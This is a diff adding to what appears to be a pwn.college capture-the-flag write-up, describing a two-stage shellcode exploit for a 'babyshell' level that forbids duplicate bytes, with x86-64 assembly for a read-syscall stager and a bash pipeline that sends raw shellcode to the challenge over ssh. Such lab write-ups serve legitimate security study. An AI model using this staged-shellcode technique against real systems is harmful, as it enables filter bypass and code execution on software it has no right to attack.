@@ -298,4 +298,23 @@ flag: .ascii "/flag"
 Solution for 8 works here as well, maybe I tried too hard in the previous one?
 
 #### 10
-Now this one is tough
+Now this one is tough, we can't use duplicated bytes in our shellcode. No way we can input the whole code once then, we need a **2 stage** exploit, we need to read in another shellcode and run that to bypass the filter. Here is the code that does that, and we can run the shellcode for the 1st stage:
+
+```assembly
+.global _start
+
+_start:
+  xorq %rdi, %rdi
+  addb $0xd, %dl
+  pushq %rdx
+  popq %rsi
+  pushq $0x44
+  popq %rdx
+  syscall
+```
+In order to keep stdin open and control the outputs, we can use this command:
+```bash
+(cat 10.raw; sleep 30; cat 1.raw) | ssh cse466@cse466.pwn.college /babyshell_level10_testing1
+```
+
+#### 11
